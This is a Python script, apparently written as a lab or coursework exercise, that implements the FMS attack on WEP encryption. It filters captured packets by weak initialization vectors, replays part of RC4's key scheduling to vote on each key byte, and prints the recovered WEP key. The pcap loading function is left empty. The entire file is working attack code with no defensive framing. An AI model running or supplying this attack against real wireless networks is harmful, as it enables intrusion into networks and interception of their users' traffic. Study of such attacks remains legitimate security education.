import pandas as pd


def load_packets_from_pcap(file_path):
    """
    Loads WEP packets from a .pcap file and returns them
    :return first_form, second_form
    """


# Load packets from a CSV file
def load_packets_from_csv(file_path):
    df = pd.read_csv(file_path, header=None)  # No header in your CSV
    first_form = []
    second_form = []

    for _, row in df.iterrows():
        packet = row.tolist()

        # Classify the packet into first form or second form
        # First form condition: (a + 3, 255, x, y) (so v != 2 and second value is 255)
        if 3 <= packet[0] <= 7 and packet[1] == 255:
            first_form.append(packet)
        # Second form condition: (v, 257 - v, 255, y)
        elif packet[0] >= 2 and packet[1] == 257 - packet[0] and packet[2] == 255:
            second_form.append(packet)

    return first_form, second_form


def add_possible_key(possible_keys, packet, key_bytes, index=-1):
    if len(packet) < 4:
        return  # Skip if the packet is too short

    if index != -1:
        if packet[0] - 3 != index:
            return
    # Use the first 3 bytes of the packet as the IV
    K = packet[:3] + key_bytes  # Combine IV and known key bytes

    # Initialize S using the KSA
    S = [i for i in range(256)]
    j = 0

    # Perform the first len(K) iterations of KSA to initialize the state machine
    for i in range(len(K)):
        j = (j + S[i] + K[i]) % 256
        S[i], S[j] = S[j], S[i]  # Swap

    # The first keystream byte is O, computed from the known plaintext (0xAA)
    O = 0xAA ^ packet[3]  # First byte of ciphertext in the packet

    # Compute the possible key byte
    possible_key_byte = (O - j - S[len(K)]) % 256
    possible_keys.append(possible_key_byte)  # Append the possible byte for the first key byte


# FMS Attack Implementation
def fms_attack(first_form, second_form):
    key_bytes = []
    possible_keys = []  # List of possible key bytes for each position

    # Step 1: Use the second form packets to ASSIST on finding the first byte of the key
    for packet in second_form:
        add_possible_key(possible_keys, packet, key_bytes)

    # Now possible keys is a list with the possible keys for the FIRST byte only
    # Step 2: Use the first form packets to find all the bytes of the key
    for a in range(5):  # Loop over key indices (0, 1, 2, 3, 4)
        for packet in first_form:
            add_possible_key(possible_keys, packet, key_bytes, index=a)

        # Identify the most common byte as the next byte of the key
        if possible_keys:
            most_common_key_byte = max(set(possible_keys), key=possible_keys.count)
            key_bytes.append(most_common_key_byte)
        possible_keys = []  # Reset for next key byte

    return key_bytes


if __name__ == '__main__':
    # Example usage
    file_path = 'packets.csv'  # Replace with your actual CSV file path
    first_form, second_form = load_packets_from_csv(file_path)

    # Perform the FMS attack
    derived_key = fms_attack(first_form, second_form)

    # Convert the derived key into hexadecimal format
    hex_key = 0x0
    for i in range(len(derived_key)):
        hex_key += derived_key[-(i + 1)] * (256 ** i)

    # Print the derived key
    print("Derived Key:", derived_key, hex(hex_key))
